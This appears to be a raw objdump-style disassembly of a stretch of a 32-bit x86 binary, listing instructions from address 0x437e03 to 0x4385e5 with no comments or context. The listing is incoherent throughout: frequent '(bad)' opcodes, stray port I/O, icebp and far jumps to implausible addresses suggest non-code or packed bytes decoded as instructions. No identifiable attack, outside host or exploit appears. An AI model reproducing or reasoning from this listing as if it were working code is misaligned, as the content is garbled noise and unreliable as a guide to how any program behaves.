  437e03:	mov    ebp,0xbd127210
  437e08:	and    al,0x62
  437e0a:	xor    eax,0x9d87c181
  437e0f:	bound  eax,QWORD PTR [ecx+esi*4+0x72037e95]
  437e16:	mov    al,ds:0xc9345702
  437e1b:	in     eax,0xbc
  437e1d:	icebp  
  437e1e:	mov    ds:0x826a00d1,eax
  437e23:	leave  
  437e24:	push   ebx
  437e25:	adc    al,0xb4
  437e27:	pop    ebp
  437e28:	ret    
  437e29:	push   ds
  437e2a:	push   ecx
  437e2b:	bound  ecx,QWORD PTR [eax+ebx*4+0x42346b51]
  437e32:	addr16 sbb eax,0xd5efd1d
  437e38:	sbb    eax,0xe55600f1
  437e3d:	sbb    al,0xf5
  437e3f:	ficomp DWORD PTR [ecx-0x261592f8]
  437e45:	add    cl,ch
  437e47:	fwait
  437e48:	enter  0x6255,0x62
  437e4c:	dec    edi
  437e4d:	mov    edi,0xd685a5
  437e52:	adc    dh,BYTE PTR [edx+edi*8-0x3a45dbc5]
  437e59:	pop    esi
  437e5a:	push   0x26
  437e5c:	loopne 0x437ed0
  437e5e:	out    0x87,eax
  437e60:	in     eax,0xf8
  437e62:	add    BYTE PTR [esi+0x7cbf118e],cl
  437e68:	fadd   QWORD PTR [eax]
  437e6a:	add    ch,ah
  437e6c:	rol    ecx,cl
  437e6e:	je     0x437dfe
  437e70:	pop    ebx
  437e71:	mov    eax,0xf84f6c02
  437e76:	gs (bad) 
  437e78:	sbb    al,0x74
  437e7a:	fisub  DWORD PTR [eax]
  437e7c:	rol    edx,1
  437e7e:	inc    esp
  437e7f:	ins    BYTE PTR es:[di],dx
  437e81:	idiv   esi
  437e83:	inc    edi
  437e84:	repnz stc 
  437e86:	adc    eax,0x386b7b
  437e8b:	rol    BYTE PTR [esp+ecx*4],0x4c
  437e8f:	addr16 popa 
  437e91:	mov    eax,DWORD PTR [ecx*1+0x13450d59]
  437e98:	fadd   QWORD PTR [eax]
  437e9a:	add    bl,ah
  437e9c:	jp     0x437e41
  437e9e:	inc    DWORD PTR [eax]
  437ea0:	fcomp  QWORD PTR [edi-0x3f]
  437ea3:	je     0x437efe
  437ea5:	in     al,0x74
  437ea7:	and    al,0x17
  437ea9:	push   ecx
  437eaa:	into   
  437eab:	je     0x437eb0
  437ead:	sbb    BYTE PTR [eax],0x58
  437eb0:	gs out 0xfc,al
  437eb3:	jbe    0x437e6a
  437eb5:	pop    ebx
  437eb6:	jne    0x437edc
  437eb8:	fcomp  st(3)
  437eba:	ins    BYTE PTR es:[edi],dx
  437ebb:	or     BYTE PTR [ecx+0x426658b9],ah
  437ec1:	loopne 0x437f34
  437ec3:	inc    esi
  437ec4:	push   eax
  437ec5:	xor    BYTE PTR [eax+ebx*1],ah
  437ec8:	(bad)  
  437ec9:	loop   0x437ed7
  437ecb:	call   0x14c1:0xe871683e
  437ed2:	cli    
  437ed3:	(bad)  
  437ed4:	mov    eax,0xa77c8100
  437ed9:	push   0xfffffff8
  437edb:	jae    0x437f3f
  437edd:	sbb    dl,0x1d
  437ee0:	sub    ah,BYTE PTR [eax+0x75]
  437ee3:	add    al,0xd
  437ee5:	cmp    BYTE PTR [ebx],dl
  437ee7:	rol    BYTE PTR [ecx+ebp*8],0xff
  437eeb:	jo     0x437ed6
  437eed:	inc    ebp
  437eee:	and    BYTE PTR [eax],bl
  437ef0:	and    DWORD PTR [esp+0x5b],ebx
  437ef4:	sub    DWORD PTR [esi],ebx
  437ef6:	sub    DWORD PTR [ebp*2+0x55f8b5f2],ebx
  437efd:	nop
  437efe:	jp     0x437ec1
  437f00:	lods   eax,DWORD PTR ds:[esi]
  437f01:	mov    dh,0xa7
  437f03:	push   esp
  437f04:	add    cl,ah
  437f06:	xor    al,0xed
  437f08:	mov    esp,0x1428b4e9
  437f0d:	dec    edx
  437f0e:	pusha  
  437f0f:	mov    al,ds:0x44642df9
  437f14:	in     eax,0x39
  437f16:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  437f17:	jns    0x437f00
  437f19:	mov    ch,0xeb
  437f1b:	dec    edx
  437f1c:	add    DWORD PTR [edi],0xffffffc6
  437f1f:	icebp  
  437f20:	or     BYTE PTR ds:0x1a7cf4cd,0x60
  437f27:	pop    esp
  437f28:	lahf   
  437f29:	bound  esi,QWORD PTR [eax+0x4]
  437f2c:	sub    eax,0x6b5a22
  437f31:	bound  esi,QWORD PTR [eax+0x7f]
  437f34:	stc    
  437f35:	outs   dx,DWORD PTR ds:[esi]
  437f36:	push   0x922c011
  437f3b:	ja     0x437f3d
  437f3d:	bound  esi,QWORD PTR [eax-0x4f]
  437f40:	test   BYTE PTR [esi],ch
  437f42:	fdiv   st(0),st
  437f44:	push   ecx
  437f45:	fldenv [eax+eiz*1]
  437f48:	adc    al,0xe1
  437f4a:	test   eax,0x25b33545
  437f4f:	adc    DWORD PTR ds:0x86212d8b,esi
  437f55:	dec    ebp
  437f56:	fldz   
  437f58:	lea    edx,[ecx]
  437f5a:	(bad)  
  437f5c:	(bad)  
  437f5d:	aam    0xb2
  437f5f:	sbb    edi,edx
  437f61:	aaa    
  437f62:	mov    dl,0xf6
  437f64:	xchg   DWORD PTR [ebp+ebp*8-0x18ff3b6b],edx
  437f6b:	into   
  437f6c:	out    0x8d,al
  437f6e:	cs mov dh,0xde
  437f71:	lea    ebp,[edx+esi*4+0x727bd7f9]
  437f78:	es mov bh,0x5a
  437f7b:	int3   
  437f7c:	stc    
  437f7d:	lock xchg ebp,eax
  437f7f:	fldenv [edx+0x53]
  437f82:	iret   
  437f83:	nop
  437f84:	(bad)  
  437f85:	or     BYTE PTR ds:0x3ab4edec,ch
  437f8b:	int3   
  437f8c:	f2xm1  
  437f8e:	jne    0x437f69
  437f90:	bound  ebp,QWORD PTR [ebx]
  437f92:	scas   eax,DWORD PTR es:[edi]
  437f93:	nop
  437f94:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  437f95:	or     BYTE PTR [edi],dh
  437f97:	in     al,dx
  437f98:	retf   
  437f99:	xchg   BYTE PTR [eax],dl
  437f9b:	in     eax,dx
  437f9c:	test   DWORD PTR [esi+0x10f3ed2f],0xcdb35c1c
  437fa6:	jae    0x437f7e
  437fa8:	aas    
  437fa9:	(bad)  
  437faa:	std    
  437fab:	(bad)  
  437fac:	aaa    
  437fad:	add    al,0x3f
  437faf:	imul   esi,ebp,0x2c1ea0f8
  437fb5:	or     DWORD PTR [edi],edx
  437fb7:	in     eax,0x4f
  437fb9:	pop    eax
  437fba:	fdiv   QWORD PTR [edx+0x18a2105a]
  437fc0:	gs push ebp
  437fc2:	pop    ebx
  437fc3:	push   ss
  437fc4:	and    dl,BYTE PTR [eax+ebp*4-0x3f]
  437fc8:	aaa    
  437fc9:	and    ch,cl
  437fcb:	push   ecx
  437fcc:	and    BYTE PTR [ebp+0x1060e00],ch
  437fd2:	xchg   esp,eax
  437fd3:	and    edx,ecx
  437fd5:	add    BYTE PTR [edx+ebp*1+0x2b72507e],dl
  437fdc:	pop    edx
  437fdd:	out    0x94,al
  437fdf:	xchg   edx,eax
  437fe0:	pop    edx
  437fe1:	clc    
  437fe2:	popf   
  437fe3:	mov    esp,esp
  437fe5:	enter  0x280e,0x3d
  437fe9:	add    ecx,ebp
  437feb:	popa   
  437fec:	mov    ah,0xc0
  437fee:	adc    BYTE PTR [ecx+ebx*8],al
  437ff1:	add    cl,ch
  437ff3:	in     al,0x5f
  437ff5:	outs   dx,BYTE PTR ds:[esi]
  437ff6:	loope  0x43804a
  437ff8:	cdq    
  437ff9:	inc    ecx
  437ffa:	rcl    bh,1
  437ffc:	fld    DWORD PTR [eax]
  437ffe:	jmp    0xd98de0f
  438003:	push   edx
  438004:	or     ecx,DWORD PTR [ebp+edx*2-0x4f7c327e]
  43800b:	test   eax,0x4c34f1ae
  438010:	scas   al,BYTE PTR es:[edi]
  438011:	fnstcw WORD PTR [esp+eax*4]
  438014:	shr    BYTE PTR [edi+0x6e2a28d6],cl
  43801a:	jmp    0x3eb1f39b
  43801f:	jne    0x438093
  438021:	pop    edi
  438022:	ins    BYTE PTR es:[edi],dx
  438023:	push   esp
  438024:	in     eax,dx
  438025:	pop    eax
  438026:	push   0xffffffa1
  438028:	arpl   WORD PTR [edi],ax
  43802a:	ds icebp 
  43802c:	shr    DWORD PTR [edi-0xd41a74b],1
  438032:	std    
  438033:	add    BYTE PTR [edx-0x66ebb682],cl
  438039:	enter  0xfb70,0xa1
  43803d:	mov    ebx,DWORD PTR fs:[ecx-0x23]
  438041:	pushf  
  438042:	clc    
  438043:	adc    bh,BYTE PTR [edi-0x18]
  438046:	add    al,0xb6
  438048:	sbb    al,cl
  43804a:	jo     0x43804c
  43804c:	cdq    
  43804d:	cwde   
  43804e:	clc    
  43804f:	mov    al,BYTE PTR [ebx-0x4f003fa4]
  438055:	or     esi,DWORD PTR [esi+eiz*1+0x3e]
  438059:	pop    es
  43805a:	ins    DWORD PTR es:[edi],dx
  43805b:	and    cl,BYTE PTR [esi]
  43805d:	mov    ah,0x6c
  43805f:	push   ds
  438060:	mov    eax,0xf5db83ae
  438065:	jbe    0x438070
  438067:	mov    bh,0xee
  438069:	fmul   DWORD PTR [ecx]
  43806b:	mov    bh,0x8c
  43806d:	ret    
  43806e:	lock jne 0x437ff5
  438071:	pop    ebx
  438072:	les    eax,FWORD PTR [edx]
  438074:	clc    
  438075:	pop    ss
  438076:	test   DWORD PTR [ecx-0x50],0x30ea74ab
  43807d:	ficomp WORD PTR ds:0x411d78f3
  438083:	test   DWORD PTR ds:0x2cc8495f,ebp
  438089:	mov    dl,0xd
  43808b:	imul   BYTE PTR [eax+0xe]
  43808e:	jle    0x438056
  438090:	push   ebp
  438091:	xor    al,0x59
  438093:	pop    ebp
  438094:	stc    
  438095:	pop    edi
  438096:	clc    
  438097:	push   edx
  438098:	add    al,al
  43809a:	cmp    al,0x24
  43809c:	or     al,0x5e
  43809e:	in     al,0x64
  4380a0:	and    al,0xf
  4380a2:	pop    ecx
  4380a3:	into   
  4380a4:	jg     0x4380a4
  4380a6:	pop    edx
  4380a7:	leave  
  4380a8:	jmp    eax
  4380aa:	pushf  
  4380ab:	push   edx
  4380ac:	push   edi
  4380ad:	jo     0x43804b
  4380af:	and    al,0x14
  4380b1:	xchg   ah,dl
  4380b3:	or     eax,0x51dd6156
  4380b8:	dec    DWORD PTR [esi]
  4380ba:	test   BYTE PTR [edx],dl
  4380bc:	inc    eax
  4380bd:	retf   
  4380be:	pop    edx
  4380bf:	mov    ebp,0x2424460c
  4380c4:	and    BYTE PTR [edx+0x22],ah
  4380c7:	mov    cl,0x4c
  4380c9:	sub    eax,0x5177f113
  4380ce:	xor    al,BYTE PTR [ebp*1+0x4c759bab]
  4380d5:	ins    BYTE PTR es:[edi],dx
  4380d6:	lods   al,BYTE PTR ds:[esi]
  4380d7:	jle    0x4380d1
  4380d9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4380da:	sub    al,0xf5
  4380dc:	push   eax
  4380dd:	popf   
  4380de:	fs aam 0xd
  4380e1:	and    dh,BYTE PTR [edx+0x57]
  4380e4:	add    dl,BYTE PTR [ecx-0x47]
  4380e7:	loope  0x43806f
  4380e9:	push   esi
  4380ea:	cmp    ebp,DWORD PTR [ebx+0x3f371f59]
  4380f0:	dec    ebp
  4380f1:	jmp    0x1553993b
  4380f6:	idiv   DWORD PTR [edi+0x4afd5223]
  4380fc:	jns    0x4380fe
  4380fe:	addr16 out dx,eax
  438100:	xor    al,0xf9
  438102:	dec    ecx
  438103:	mov    ecx,0xd4d684b2
  438108:	in     al,dx
  438109:	push   eax
  43810a:	mov    eax,0x57f8b270
  43810f:	adc    al,0xf3
  438111:	aas    
  438112:	(bad)  
  438113:	out    dx,eax
  438114:	inc    eax
  438115:	or     al,0xdf
  438117:	mov    ah,0x20
  438119:	sbb    al,0x92
  43811b:	mov    edi,0x661d51b1
  438120:	enter  0xa20c,0x70
  438124:	inc    edx
  438125:	inc    esp
  438126:	dec    esp
  438127:	dec    ebx
  438128:	std    
  438129:	jl     0x438135
  43812b:	push   esp
  43812c:	enter  0x9406,0x5b
  438130:	call   0xfcf3d244
  438135:	in     al,0x66
  438137:	xor    al,BYTE PTR [ecx]
  438139:	xor    BYTE PTR [edx-0x2e],ah
  43813c:	test   eax,0xb4d9a154
  438141:	jl     0x438109
  438143:	or     BYTE PTR [ebx-0x21],ch
  438146:	leave  
  438147:	fnstenv [edi-0x4636de8a]
  43814d:	dec    eax
  43814e:	xor    ebp,edx
  438150:	cli    
  438151:	xor    eax,0x5c3614e9
  438156:	adc    al,0x6c
  438158:	das    
  438159:	dec    ecx
  43815a:	fild   QWORD PTR [ecx+0x5d]
  43815d:	push   edx
  43815e:	adc    eax,0xb772cf
  438163:	cdq    
  438164:	jno    0x4380f1
  438166:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  438167:	mov    esp,DWORD PTR [edx+0x3]
  43816a:	cld    
  43816b:	ficom  WORD PTR [edx+eiz*8]
  43816e:	jl     0x438191
  438170:	gs jno 0x438176
  438173:	fistp  WORD PTR [ebx+0x6af3a98]
  438179:	xchg   ebp,eax
  43817a:	mov    cl,0xde
  43817c:	in     eax,dx
  43817d:	mov    ebp,0x5e4eb2f3
  438182:	and    BYTE PTR [edx+0x4e],bh
  438185:	or     BYTE PTR [edi-0x5a],dh
  438188:	mov    ebp,0xed4ab409
  43818d:	std    
  43818e:	and    esp,edi
  438190:	mov    DWORD PTR [ebx+0x39],esi
  438193:	dec    edx
  438194:	les    ebp,FWORD PTR [eax+ecx*2-0x7b6db1d5]
  43819b:	das    
  43819c:	bound  ebp,QWORD PTR ds:0x1561e0e9
  4381a2:	mul    eax
  4381a4:	jae    0x4381b3
  4381a6:	sti    
  4381a7:	out    0xd2,al
  4381a9:	sub    ecx,0x228761e6
  4381af:	dec    eax
  4381b0:	push   esp
  4381b1:	(bad)  
  4381b2:	(bad)  
  4381b3:	mul    DWORD PTR [ecx-0x16]
  4381b6:	add    esp,edi
  4381b8:	xchg   edx,eax
  4381b9:	add    DWORD PTR [ecx+0x6ef843ae],eax
  4381bf:	or     al,BYTE PTR [eax]
  4381c1:	push   esi
  4381c2:	jb     0x4381e2
  4381c4:	or     al,0xc4
  4381c6:	mov    ah,0x0
  4381c8:	dec    esi
  4381c9:	jne    0x43821d
  4381cb:	push   0xffffffa4
  4381cd:	pop    ebp
  4381ce:	add    DWORD PTR [edi-0x66eee9cc],esi
  4381d4:	sub    ah,dh
  4381d6:	add    al,0x6c
  4381d8:	hlt    
  4381d9:	pop    ebp
  4381da:	jmp    0xf8a39677
  4381df:	bound  esi,QWORD PTR [ecx]
  4381e1:	push   esi
  4381e2:	out    dx,eax
  4381e3:	mov    al,ds:0x1d465c97
  4381e8:	sub    DWORD PTR [edx+0x7c1a16a3],eax
  4381ee:	or     DWORD PTR [edx-0x4c],esp
  4381f1:	(bad)  [ebx+0x25a1dac]
  4381f7:	jb     0x43821c
  4381f9:	dec    ecx
  4381fb:	sub    dh,BYTE PTR [ebx+0x5b62f25c]
  438201:	jns    0x4381cc
  438203:	mov    ebx,DWORD PTR [ebp+0x2bed6b62]
  438209:	popa   
  43820a:	dec    esi
  43820b:	(bad)  
  43820c:	push   ebx
  43820d:	std    
  43820e:	push   cs
  43820f:	sub    DWORD PTR [esi-0x22],esp
  438212:	mov    esp,0x4f1dfff5
  438217:	jb     0x4381a9
  438219:	or     cl,BYTE PTR [eax+esi*4+0x34f863e1]
  438220:	pop    ds
  438221:	or     bh,al
  438223:	cld    
  438224:	xor    edi,ecx
  438226:	inc    eax
  438227:	jmp    0x9fc1ebb4
  43822c:	add    BYTE PTR [edi+esi*4],bl
  43822f:	push   0xffffffe9
  438231:	iret   
  438232:	push   ebp
  438233:	rol    BYTE PTR [eax],1
  438235:	mov    ds:0xfb00fbfe,al
  43823a:	add    al,0xb
  43823c:	out    0x6c,al
  43823e:	sbb    BYTE PTR [esi+0x7c],bh
  438241:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  438242:	push   0x1546077f
  438247:	ins    DWORD PTR es:[edi],dx
  438248:	adc    DWORD PTR [ebx],ecx
  43824a:	fidiv  WORD PTR [ecx+0x4]
  43824d:	sub    al,0x6a
  43824f:	or     BYTE PTR [ebx],dl
  438251:	or     ebx,ebp
  438253:	jg     0x43829c
  438255:	mov    bl,0x4c
  438257:	clc    
  438258:	jmp    0x1acd:0x5fc0cab9
  43825f:	std    
  438260:	dec    DWORD PTR [eax]
  438262:	add    DWORD PTR ds:0x7d2ed653,esp
  438268:	icebp  
  438269:	aam    0xe
  43826b:	inc    ebx
  43826c:	sbb    al,0x8b
  43826e:	nop
  43826f:	pop    eax
  438270:	push   0xffffffab
  438272:	mov    eax,DWORD PTR cs:[edi+eiz*4-0x44]
  438277:	push   eax
  438278:	call   0x3dbd7a
  43827d:	clc    
  43827e:	js     0x4382a4
  438280:	xor    al,0x5c
  438282:	retf   
  438283:	stc    
  438284:	mov    ebx,DWORD PTR [ecx*8-0x454aef86]
  43828b:	jge    0x4382d3
  43828d:	aas    
  43828e:	(bad)  [ebp-0x4678ff77]
  438294:	sbb    al,0x8b
  438296:	test   DWORD PTR [ebp+0x1d],esp
  438299:	ret    
  43829a:	mov    esi,0xc2182428
  43829f:	and    BYTE PTR [eax+ebp*1],ah
  4382a2:	and    edx,DWORD PTR [ebx-0x6]
  4382a5:	(bad)  
  4382a6:	mov    esp,0x875c0df
  4382ab:	fwait
  4382ac:	sub    eax,0xd262625e
  4382b1:	aam    0xeb
  4382b3:	iret   
  4382b4:	lock xchg BYTE PTR [edx+edi*2+0x12],dh
  4382b9:	sar    bl,0x88
  4382bc:	std    
  4382bd:	jmp    DWORD PTR [edx-0x5]
  4382c0:	mov    bh,0x23
  4382c2:	xchg   edx,eax
  4382c3:	jae    0x438308
  4382c5:	xchg   DWORD PTR [esi+ebx*2],esi
  4382c8:	jne    0x43830c
  4382ca:	push   0x42
  4382cc:	std    
  4382cd:	out    0x6c,al
  4382cf:	jno    0x4382d5
  4382d1:	add    BYTE PTR [ecx+0xf],dh
  4382d4:	adc    eax,edi
  4382d6:	and    ebp,ecx
  4382d8:	mov    ebp,0x4bed913
  4382dd:	jp     0x438339
  4382df:	ja     0x438359
  4382e1:	lock bound esi,QWORD PTR [edx+0x4]
  4382e5:	test   DWORD PTR [ebx+0x1e872cea],ecx
  4382eb:	xchg   esi,eax
  4382ec:	call   0x7ab19f75
  4382f1:	or     al,0x61
  4382f3:	mov    esi,gs
  4382f5:	jb     0x4382f7
  4382f7:	push   0xf60fbe9b
  4382fc:	sbb    BYTE PTR [ebp-0x40],dl
  4382ff:	bound  esi,QWORD PTR [edx+0x4]
  438302:	lods   al,BYTE PTR ss:[esi]
  438304:	jno    0x4382f5
  438306:	cmp    DWORD PTR [ecx+esi*2],0x4
  43830a:	add    BYTE PTR [ecx-0x38c1302],cl
  438310:	jle    0x4382c9
  438312:	sbb    ebp,DWORD PTR [esi-0x5]
  438315:	mov    dh,0xb
  438317:	call   0x96cb7898
  43831c:	aam    0xf2
  43831e:	jae    0x438384
  438320:	push   ds
  438321:	mov    bh,0x1b
  438323:	push   0xffffffa4
  438325:	in     al,0x85
  438327:	and    ebx,edx
  438329:	int    0xc2
  43832b:	dec    ecx
  43832c:	ror    BYTE PTR [esi],0x1
  43832f:	loop   0x4382c9
  438331:	retf   0xbc79
  438334:	lods   eax,DWORD PTR ds:[esi]
  438335:	sub    BYTE PTR [eax],cl
  438337:	dec    ebp
  438338:	out    0xc4,al
  43833a:	sub    DWORD PTR [ecx+edi*4+0x1f5b2492],0xffffffa9
  438342:	mov    ah,0xda
  438344:	(bad)  
  438345:	in     eax,0xef
  438347:	xchg   ebp,eax
  438348:	fldz   
  43834a:	test   DWORD PTR [esi],ebx
  43834c:	mov    ch,0xfb
  43834e:	mov    dl,0xdd
  438350:	adc    eax,0xc4baed06
  438355:	(bad)
  438358:	fnstenv [ebx-0x48]
  43835b:	add    BYTE PTR [ecx+0x6c3473ca],al
  438361:	xchg   ebx,eax
  438362:	mov    dh,0xa7
  438364:	xchg   ebx,eax
  438365:	pop    ss
  438366:	mov    BYTE PTR [ecx],0x6b
  438369:	push   ebp
  43836a:	mov    ah,0x44
  43836c:	mov    ebx,DWORD PTR [esi+0x6a]
  43836f:	dec    ebx
  438370:	pop    esp
  438371:	in     al,0xca
  438373:	xor    DWORD PTR [esp+ecx*8-0x74],0xffffffe5
  438378:	fiadd  WORD PTR ds:0x736efc6
  43837e:	(bad)  
  438380:	out    0xa9,al
  438382:	out    dx,al
  438383:	inc    esp
  438384:	pop    ebx
  438385:	push   edx
  438386:	mov    al,ds:0x220d8df7
  43838b:	add    ebx,DWORD PTR [ebx+0x54]
  43838e:	add    BYTE PTR [ebp+0x4b],al
  438391:	pop    esi
  438392:	daa    
  438393:	ret    0xaf46
  438396:	imul   ecx,DWORD PTR [ecx+0x5c],0x2aea64ce
  43839d:	pop    esi
  43839e:	mov    bh,0x83
  4383a0:	sub    eax,0x9ce600cc
  4383a5:	leave  
  4383a6:	imul   DWORD PTR [esi-0xe995b62]
  4383ac:	push   ss
  4383ad:	(bad)  
  4383af:	popf   
  4383b0:	sahf   
  4383b1:	pusha  
  4383b2:	mov    WORD PTR [edi],gs
  4383b4:	bound  esp,QWORD PTR [ecx-0x2f9f0eb4]
  4383ba:	jge    0x43833f
  4383bc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4383bd:	pusha  
  4383be:	clc    
  4383bf:	sub    al,BYTE PTR [eax]
  4383c1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4383c2:	push   esp
  4383c3:	dec    ebp
  4383c4:	int    0xcd
  4383c6:	sbb    BYTE PTR [ebx+0x2a],al
  4383c9:	adc    eax,0xd20d4d57
  4383ce:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4383cf:	push   esi
  4383d0:	icebp  
  4383d1:	into   
  4383d2:	pop    edx
  4383d3:	sbb    al,0x56
  4383d5:	es pusha 
  4383d7:	xor    al,0x20
  4383d9:	mov    al,ds:0x60e53f67
  4383de:	push   esi
  4383df:	ja     0x4383c2
  4383e1:	xchg   ebp,eax
  4383e2:	aad    0x33
  4383e4:	and    BYTE PTR [edx-0x1d],ch
  4383e7:	adc    dh,bl
  4383e9:	add    eax,0xc6288b1e
  4383ee:	call   DWORD PTR [ebp-0x3e]
  4383f1:	loop   0x438387
  4383f3:	and    eax,0x21afb2a
  4383f8:	bound  ebp,QWORD PTR [edi-0x383dbc27]
  4383fe:	aad    0x73
  438400:	icebp  
  438401:	pop    ecx
  438402:	aad    0x19
  438404:	jge    0x4383b2
  438406:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  438407:	push   esi
  438408:	loope  0x43842e
  43840a:	aad    0x8b
  43840c:	das    
  43840d:	jbe    0x438483
  43840f:	mov    ebx,0x6b62a1df
  438414:	or     DWORD PTR [eax],ebx
  438416:	push   eax
  438417:	cmp    eax,0xe90d3e05
  43841c:	add    cl,ch
  43841e:	cmc    
  43841f:	stc    
  438420:	(bad)  
  438421:	cmp    bh,BYTE PTR [ebp+0x24]
  438424:	sbb    al,0x0
  438426:	bound  edi,QWORD PTR [ecx+0x24]
  438429:	and    BYTE PTR [edx+0x36eb1097],al
  43842f:	dec    esp
  438430:	inc    ebx
  438431:	or     al,0xf8
  438433:	jo     0x7db8b37d
  438439:	inc    esi
  43843a:	sti    
  43843b:	imul   eax,ecx,0xffffff8d
  43843e:	aaa    
  43843f:	jno    0x438451
  438441:	mov    DWORD PTR [edi],edi
  438443:	jno    0x438465
  438445:	call   0x3d9ef5
  43844a:	inc    eax
  43844b:	mov    DWORD PTR [eax+esi*1],esp
  43844e:	mov    eax,0x634e8007
  438453:	push   ecx
  438454:	ror    DWORD PTR [edi],0x4e
  438457:	and    dl,bh
  438459:	jmp    DWORD PTR [eax+edx*4]
  43845c:	sub    eax,0xca268b7e
  438461:	jmp    0x3d9f68
  438466:	mov    eax,ds:0xb2d868cc
  43846b:	xchg   esp,eax
  43846c:	clc    
  43846d:	out    0xbb,eax
  43846f:	out    0x0,eax
  438471:	add    BYTE PTR [eax+0x57757fa2],ch
  438477:	dec    esp
  438478:	cmp    BYTE PTR [eax+ecx*4],bh
  43847b:	adc    eax,0xc4e3b70a
  438480:	or     DWORD PTR [edi-0x7a9d2d35],esi
  438486:	jns    0x4384a9
  438488:	and    ch,BYTE PTR [edx+0x0]
  43848b:	dec    ecx
  43848c:	jnp    0x4384f0
  43848e:	cmp    esp,DWORD PTR [ecx]
  438490:	and    ebx,DWORD PTR [edx]
  438492:	mov    ebp,DWORD PTR [edi+0x62036cd0]
  438498:	add    DWORD PTR [ebp-0x4f74c18d],0x43bcb200
  4384a2:	adc    ecx,DWORD PTR [esi-0x80]
  4384a5:	(bad)  
  4384a6:	call   DWORD PTR [eax+0x39]
  4384a9:	mov    eax,eax
  4384ab:	gs mov ch,0x2d
  4384ae:	xchg   DWORD PTR [edi+0x64b7f4e],edx
  4384b4:	cmp    eax,DWORD PTR [edi-0x108af63e]
  4384ba:	mov    edi,0x63872fa2
  4384bf:	cli    
  4384c0:	out    dx,al
  4384c1:	sar    bl,1
  4384c3:	in     eax,0x1e
  4384c5:	inc    esp
  4384c6:	call   0x479851
  4384cb:	mov    al,ds:0x6a660475
  4384d0:	mov    ch,BYTE PTR [edi+edx*1]
  4384d3:	push   ds
  4384d4:	jb     0x438502
  4384d6:	(bad)  
  4384d7:	or     al,0x72
  4384d9:	add    al,0x85
  4384db:	mov    al,0xf6
  4384dd:	xor    al,0x87
  4384df:	das    
  4384e0:	push   cs
  4384e1:	jg     0x438546
  4384e3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4384e4:	jno    0x43846d
  4384e6:	dec    ecx
  4384e7:	pop    esi
  4384e8:	outs   dx,DWORD PTR ds:[esi]
  4384e9:	push   ebx
  4384ea:	jge    0x4384c7
  4384ec:	push   ebp
  4384ed:	add    al,0x0
  4384ef:	add    BYTE PTR [edx+0x72],ah
  4384f2:	adc    eax,DWORD PTR [ebx+ebp*8-0x16fffb8f]
  4384f9:	loopne 0x43855e
  4384fb:	add    BYTE PTR [edx+0x72],ah
  4384fe:	mov    esi,ecx
  438500:	pop    ebp
  438501:	out    dx,al
  438502:	xchg   BYTE PTR [eax],al
  438504:	bound  esi,QWORD PTR [edx-0x3]
  438507:	jp     0x438577
  438509:	mul    eax
  43850b:	movntq QWORD PTR [ebx+eiz*1-0xf],mm6
  438510:	sub    edx,ebx
  438512:	add    bl,BYTE PTR [ebp+0x67]
  438515:	xor    DWORD PTR [ebx-0x39],0xf828ae65
  43851c:	fcom   QWORD PTR [edx+eiz*8]
  43851f:	in     al,dx
  438520:	mov    esp,0x55b770a5
  438525:	(bad)  
  438526:	mov    cs,WORD PTR [ebx-0x1947e4f]
  43852c:	adc    eax,0x4c8d0de7
  438531:	aad    0x6a
  438533:	cmp    al,0x5a
  438535:	out    0x1e,eax
  438537:	test   DWORD PTR [edx],esp
  438539:	bound  edi,QWORD PTR [ecx-0x75eb22d4]
  43853f:	cmc    
  438540:	repz push eax
  438542:	cmc    
  438543:	pop    edi
  438544:	das    
  438545:	imul   edi,ebx,0x1e226af9
  43854b:	mov    dh,0x5d
  43854d:	repz pop esp
  43854f:	dec    ebx
  438550:	push   esi
  438551:	mov    al,0x68
  438553:	and    eax,DWORD PTR [eax]
  438555:	retf   
  438556:	retf   0x3e9
  438559:	mov    edi,0x6f50ead0
  43855e:	or     al,0xd6
  438560:	mov    ch,0x57
  438562:	push   esp
  438563:	and    edi,DWORD PTR [eax-0x46cd619f]
  438569:	outs   dx,DWORD PTR ds:[esi]
  43856a:	dec    esi
  43856b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43856c:	adc    edi,DWORD PTR ds:0x8f0362d8
  438572:	adc    eax,0x4f858af2
  438577:	xchg   ebp,eax
  438578:	daa    
  438579:	out    0x14,eax
  43857b:	or     cl,dl
  43857d:	jle    0x438515
  43857f:	jmp    0x438556
  438581:	popa   
  438582:	outs   dx,BYTE PTR ds:[esi]
  438583:	inc    esi
  438584:	test   DWORD PTR [ecx],ebx
  438586:	pop    ebp
  438587:	div    DWORD PTR [ebx+0x5d]
  43858a:	outs   dx,DWORD PTR ds:[esi]
  43858b:	add    esp,esp
  43858d:	dec    esi
  43858e:	sbb    al,BYTE PTR [ecx+0x2a]
  438591:	fcomip st,st(5)
  438593:	call   0xf8a19a02
  438598:	sbb    esp,DWORD PTR [esi+0x61874d71]
  43859e:	fld    st(2)
  4385a0:	frstor [ecx-0xd]
  4385a3:	adc    al,0x51
  4385a5:	xchg   esi,eax
  4385a6:	ret    0xe93c
  4385a9:	dec    ecx
  4385aa:	shl    DWORD PTR [esi-0x4ab9e17],cl
  4385b0:	pusha  
  4385b1:	sbb    al,0x82
  4385b3:	test   BYTE PTR [edx+eiz*4],cl
  4385b6:	(bad)  [ebx+0x54620026]
  4385bc:	cmp    eax,0x3e5311d1
  4385c1:	mov    edi,esi
  4385c3:	test   BYTE PTR [ecx+0x40f33b24],cl
  4385c9:	adc    DWORD PTR [esi-0x57],esp
  4385cc:	add    cl,ch
  4385ce:	mov    cl,0xf3
  4385d0:	add    BYTE PTR [eax],bl
  4385d2:	and    eax,esi
  4385d4:	ins    BYTE PTR es:[edi],dx
  4385d5:	clc    
  4385d6:	mov    eax,ds:0xe8598b59
  4385db:	in     eax,0xcc
  4385dd:	ins    BYTE PTR es:[edi],dx
  4385de:	jnp    0x4385c5
  4385e0:	bound  esp,QWORD PTR [edx-0x6c]
  4385e3:	jns    0x438571
  4385e5:	ss jns 0x438600
